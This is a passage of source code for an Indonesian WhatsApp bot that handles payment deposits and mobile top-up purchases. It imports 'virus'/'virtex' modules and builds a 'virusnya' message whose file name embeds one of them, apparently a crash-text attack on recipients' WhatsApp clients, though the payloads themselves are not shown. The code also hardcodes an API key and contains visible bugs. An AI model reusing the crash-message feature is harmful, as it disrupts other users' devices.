"use strict";
const { default: makeWASocket, useSingleFileAuthState, downloadContentFromMessage } = require("@adiwajshing/baileys")
const { exec, spawn } = require("child_process");
const { color, bgcolor } = require('./function/console')
const { getBuffer, fetchJson, fetchText, getRandom, getGroupAdmins, runtime, sleep, reSize, makeid, jsonFormt } = require("./function/myfunc");

// Apinya
const fs = require("fs");
const chalk = require('chalk');
const qs = require("querystring");
const fdl = require("caliph-api");
const yogipw = require("tod-api");
const ffmpeg = require("fluent-ffmpeg");
const speed = require("performance-now");
const moment = require("moment-timezone");
const java_script = require("javascript-obfuscator");
const os = require('os')

// Database
let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
let welcome = JSON.parse(fs.readFileSync('./database/welcome.json'));
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'));
let anonymous = JSON.parse(fs.readFileSync('./database/anonymous.json'));
let user = JSON.parse(fs.readFileSync('./database/user.json'));
let db_menfes = JSON.parse(fs.readFileSync('./database/menfess.json'));
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'));
let db_respon_list = JSON.parse(fs.readFileSync('./database/list_message.json'));
let db_dashboard = JSON.parse(fs.readFileSync('./database/dashboard.json'));
let db_saldo = JSON.parse(fs.readFileSync("./database/saldo.json"));
let db_error = JSON.parse(fs.readFileSync("./database/error.json"));
let depositPath = "./options/deposit/"
let topupPath = "./options/topup/"
let judullist = []
let daftarlist = []
let db_spam = []

//Database virtex
const { virus } = require('./options/virus/virus')
const { virtex } = require('./options/virus/virtex')
const { philips } = require('./options/virus/philips')
const { ngazap } = require('./options/virus/ngazap')
const { buttonvirus } = require('./options/virus/buttonvirus')
const { buttonvirus2 } = require('./options/virus/buttonvirus2')

// Response
const { api, apikey, apikeyAntlatic, botName, owner, ownerNomer, ownerName, footer, packname, author, sessionName, thumbnail, qris, menfess, source, bc, responP, sp, mess, payment } = require("./options/setting");
const { addSaldo, minSaldo, cekSaldo } = require("./function/deposit");
const { addCmd } = require('./function/cmd')
const { stalkff, stalkml } = require("./function/stalker");
const { pinterest, wallpaper, wikimedia, quotesAnime, komiku, ssweb, sholat, tafsirsurah, fbdl } = require("./function/scraper");
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./function/setdone');
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./function/setproses');
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./function/respon-list');
const { TelegraPh } = require('./function/uploader');
const msgFilter = require("./function/spam");
const timestampi = speed();
const latensii = speed() - timestampi;

//Date
moment.tz.setDefault("Asia/Jakarta").locale("id");
const d = new Date 
const tanggal = d.toLocaleDateString('id', { 
day: 'numeric', 
month: 'long', 
year: 'numeric' 
})
const dnew = new Date(new Date + 3600000)
const dateIslamic = Intl.DateTimeFormat('id' + '-TN-u-ca-islamic', {
day: 'numeric',
month: 'long',
year: 'numeric'
}).format(dnew)

//Enter
const enter1 = "\n"
const enter2 = "\n\n"
const enter3 = "\n\n\n"

//Apikey
let lolkey = 'SadTeams'

module.exports = async(ronzz, msg, m, store, welcome, left) => {
try {
const { type, quotedMsg, mentioned, now, fromMe, isBaileys } = msg
if (msg.isBaileys) return
const jamwib = moment.tz('asia/jakarta').format('HH:mm:ss')
const jamwita = moment.tz('asia/makassar').format('HH:mm:ss')
const jamwit = moment.tz('asia/jayapura').format('HH:mm:ss')
const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
const toJSON = j => JSON.stringify(j, null,'\t')
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
const isGroup = msg.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const isOwner = ["628817839722","16784037437",owner,ronzz.user.id].replace(/[^0-9]/gi, '')+"@s.whatsapp.net".includes(sender) ? true : false
const pushname = msg.pushName
const body = chats.startsWith(prefix) ? chats : ''
const budy = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : ''
const args = body.trim().split(/ +/).slice(1);
const q = args.join(" ");
const isCommand = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const isCmd = isCommand ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : null;
const botNumber = ronzz.user.id
const groupMetadata = isGroup ? await ronzz.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender)
const participants = isGroup ? await groupMetadata.participants : ''
const isAntiLink = antilink.includes(from) ? true : false

const quoted = msg.quoted ? msg.quoted : msg
const mime = (quoted.msg || quoted).mimetype || ''
const isImage = (type == 'imageMessage')
const isQuotedMsg = (type == 'extendedTextMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage');
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const isVideo = (type == 'videoMessage')
const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
const isSticker = (type == 'stickerMessage')
const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false 
const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
const dataGroup = (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
const dataPrivate = (type === "messageContextInfo") ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isButton = dataGroup.length !== 0 ? dataGroup : dataPrivate
const dataListG = (type === "listResponseMessage") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const dataList = (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isListMessage = dataListG.length !== 0 ? dataListG : dataList

const reply = (teks) => {ronzz.sendMessage(from, { text: teks }, { quoted: msg })}
const reply2 = (teks) => {ronzz.sendMessage(from, { text: teks , contextInfo: { forwardingScore: 9999999, isForwarded: true }}, { quoted : fkontak })}
const textImg = (teks) => {return ronzz.sendMessage(from, { text: teks, jpegThumbnail: fs.readFileSync(thumbnail) }, { quoted: msg })}
const sendMess = (hehe, teks) => {ronzz.sendMessage(hehe, { text, teks })}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `Bot Created By Ronzz YT\n`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;VelzzyBot,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(thumbnail)}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
const sendContact = (jid, numbers, name, quoted, mn) => {
let number = numbers.replace(/[^0-9]/g, '')
const vcard = 'BEGIN:VCARD\n' 
+ 'VERSION:3.0\n' 
+ 'FN:' + name + '\n'
+ 'ORG:;\n'
+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
+ 'END:VCARD'
return ronzz.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: quoted })
}
const virusnya = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `VelzzyBOT ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}
const sendMessRegis = (jid) => {ronzz.sendMessage(jid, { text: `Maaf @${sender.split('@')[0]}, kamu belum terdaftar di database bot, klik button *Verify* untuk memverifikasi.`, button: [{buttonId: '#verify', buttonText: {displayText: 'Verify'}, type: 1}], footer: `${botName} © 2022`, contextInfo: { forwardingScore: 9999999, isForwarded: true }, mentions: [sender]}, { quoted: fkontak })}

const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []

const isEmoji = (emo) => {
let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
let regexEmoji = new RegExp(emoji_ranges, 'gi');
return emo.match(regexEmoji)
}

function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}

function ngelistisi(){
let list = '';
list += `${judullist[0]}\n`;
daftarlist.forEach(function (item, index){
index = index+1;
list += `${index}. ${item}\n`
});
return list;
}

function ngelisttugas(){
let list = '';
list += "Daftar tugas : \n"
tugas.forEach(function (item, index){
index = index+1;
list += `${index}. ${item}\n`
});
return list;
}

async function downloadAndSaveMediaMessage (type_file, path_file) {
if (type_file === 'image') {
var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk]) }
fs.writeFileSync(path_file, buffer)
return path_file } 
else if (type_file === 'video') {
var stream = await downloadContentFromMessage(msg.message.videoMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync(path_file, buffer)
return path_file
} else if (type_file === 'sticker') {
var stream = await downloadContentFromMessage(msg.message.stickerMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync(path_file, buffer)
return path_file
} else if (type_file === 'audio') {
var stream = await downloadContentFromMessage(msg.message.audioMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.audioMessage, 'audio')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync(path_file, buffer)
return path_file}
}

// FUNCTION DEPOSIT
if (isListMessage === "payment_ovo") {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "amount",
date: new Date().toLocaleDateString("ID", { timeZone: "Asia/Jakarta"}),
number: sender,
payment: "OVO",
data: {
amount_deposit: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("Oke kak mau deposit berapa?\n\nContoh: 15000")
} else {
reply("Proses Deposit kamu masih ada yang belum terselesaikan\n\nKetik N untuk membatalkan")
}
} else if (isListMessage === "payment_qris") {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "amount",
date: new Date().toLocaleDateString("ID", { timeZone: "Asia/Jakarta"}),
number: sender,
payment: "QRIS",
data: {
amount_deposit: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("Oke kak mau deposit berapa?\n\nContoh: 15000")
} else {
reply("Proses Deposit kamu masih ada yang belum terselesaikan\n\nKetik N untuk membatalkan")
}
} else if (isListMessage === "payment_dana") {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "amount",
date: new Date().toLocaleDateString("ID", { timeZone: "Asia/Jakarta"}),
number: sender,
payment: "DANA",
data: {
amount_deposit: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("Oke kak mau deposit berapa?\n\nContoh: 15000")
} else {
reply("Proses Deposit kamu masih ada yang belum terselesaikan\n\nKetik N untuk membatalkan")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "amount") {
if (isNaN(chats)) return reply("Masukan hanya angka ya")
data_deposit.data.amount_deposit = Number(chats);
if (data_deposit.data.amount_deposit < 10000) return reply(`Deposit Minimal Rp10.000`)
data_deposit.session = "konfirmasi_deposit";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`「 𝙆𝙊𝙉𝙁𝙄𝙍𝙈𝘼𝙎𝙄-𝘿𝙀𝙋𝙊𝙎𝙄𝙏 」

▪ ID Resi : ${data_deposit.ID}
▪ Nomer : ${data_deposit.number.split('@')[0]}
▪ Payment : ${data_deposit.payment}
▪ Jumlah Deposit : Rp${toRupiah(data_deposit.data.amount_deposit)}
▪ Pajak Admin : Rp2.500
▪ Total Pembayaran : Rp${toRupiah(data_deposit.data.amount_deposit+2500)}

_Deposit akan dibatalkan otomatis apabila terdapat kesalahan input._

_Ketik Y untuk melanjutkan_
_Ketik N untuk membatalkan_`)
} else if (data_deposit.session === "konfirmasi_deposit") {
if (chats.toLowerCase() === "y") {
if (data_deposit.payment === "OVO") {
var py_ovo=`༆━━[ *PAYMENT OVO* ]━━࿐
 
*Nomer :* ${payment.ovo.nomer}
*AN :* ${payment.ovo.atas_nama}

_Silahkan transfer dengan nomor yang sudah tertera, Jika sudah harap kirim bukti foto dengan caption #bukti untuk di acc oleh admin_`
reply(py_ovo)
} else if (data_deposit.payment === "QRIS") {
var qr_fexf =`༆━━[ *PAYMENT QRIS* ]━━࿐
 
*Url :* ${payment.qris.link_nya}
*AN :* ${payment.qris.atas_nama}

_Silahkan transfer dengan nomor yang sudah tertera, Jika sudah harap kirim bukti foto dengan caption #bukti untuk di acc oleh admin_`
ronzz.sendMessage(from, {image:{url:payment.qris.link_nya}, caption:qr_fexf}, {quoted: msg})
} else if (data_deposit.payment === "DANA") {
var py_dana =`༆━━[ *PAYMENT DANA* ]━━࿐
 
*Nomer :* ${payment.dana.nomer}
*AN :* ${payment.dana.atas_nama}

_Silahkan transfer dengan nomor yang sudah tertera, Jika sudah harap kirim bukti foto dengan caption #bukti untuk di acc oleh admin_`
reply(py_dana)
}} else if (chats.toLowerCase() === "n") {
reply(`Baik kak, Deposit Dengan ID : ${data_deposit.ID} dibatalkan 😊`)
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}}}}

// FUNCTION TOPUP
if (fs.existsSync(topupPath + sender.split("@")[0] + ".json")) {
let data_topup = JSON.parse(fs.readFileSync(topupPath + sender.split("@")[0] + ".json"))
if (data_topup.session === "PILIH-GAME") {
if (isListMessage === "topup_internet_three") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};

if (res.data.result == false) return reply('Server maintenance.')

let myA = [];
let row_internet_three = [];
for (let x of res.data.data) {
if (x.code.includes("TDA")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_internet_three.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih layanan internet Three yang tersedia",
buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Kuota Internet Three",
rows: row_internet_three
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
} else if (isListMessage === "topup_internet_xl") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};

if (res.data.result == false) return reply('Server maintenance.')

let myA = [];
let row_internet_exsel = [];
for (let x of res.data.data) {
if (x.code.includes("XLD")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_internet_exsel.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih layanan internet XL yang tersedia",
buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Kuota Internet XL",
rows: row_internet_exsel
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
} else if (isListMessage === "topup_internet_axis") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};

if (res.data.result == false) return reply('Server maintenance.')

let myA = [];
let row_internet_axis = [];
for (let x of res.data.data) {
if (x.code.includes("AXD")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_internet_axis.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih layanan internet Axis yang tersedia",
buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Kuota Internet Axis",
rows: row_internet_axis
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
} else if (isListMessage === "topup_internet_telkomsel") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};

if (res.data.result == false) return reply('Server maintenance.')

let myA = [];
let row_internet_telkomsel = [];
for (let x of res.data.data) {
if (x.code.includes("SDF")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_internet_telkomsel.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih layanan internet Telkomsel yang tersedia",
buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Kuota Internet Telkomsel",
rows: row_internet_telkomsel
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
} else if (isListMessage === "topup_internet_indosat") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};

if (res.data.result == false) return reply('Server maintenance.')

let myA = [];
let row_internet_xl = [];
for (let x of res.data.data) {
if (x.code.includes("IDF")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_internet_xl.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih layanan internet Indosat yang tersedia",
buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Kuota Internet Indosat",
rows: row_internet_xl
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
} else if (isListMessage === "topup_pulsa_xl") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};

if (res.data.result == false) return reply('Server maintenance.')

let myA = [];
let row_list_exsel = [];
for (let x of res.data.data) {
if (x.code.includes("XLTF")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_list_exsel.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih nominal pulsanya",
buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Nominal Pulsa XL",
rows: row_list_exsel
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
} else if (isListMessage === "topup_pulsa_three") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};

if (res.data.result == false) return reply('Server maintenance.')

let myA = [];
let row_list_three = [];
for (let x of res.data.data) {
if (x.code.includes("TTF")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_list_three.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih nominal pulsanya",
buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Nominal Pulsa Three",
rows: row_list_three
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
} else if (isListMessage === "topup_pulsa_indosat") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};

if (res.data.result == false) return reply('Server maintenance.')

let myA = [];
let row_list_indosat = [];
for (let x of res.data.data) {
if (x.code.includes("ITF")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_list_indosat.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih nominal pulsanya",
buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Nominal Pulsa Indosat",
rows: row_list_indosat
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
} else if (isListMessage === "topup_pulsa_telkomsel") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};

if (res.data.result == false) return reply('Server maintenance.')

let myA = [];
let row_list_telkom = [];
for (let x of res.data.data) {
if (x.code.includes("STF")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_list_telkom.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih nominal pulsanya",
buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Nominal Pulsa Telkomsel",
rows: row_list_telkom
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
} else if (isListMessage === "topup_pulsa_axis") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};

if (res.data.result == false) return reply('Server maintenance.')

let myA = [];
let row_list_axis = [];
for (let x of res.data.data) {
if (x.code.includes("AXTF")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_list_axis.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih nominal pulsanya",
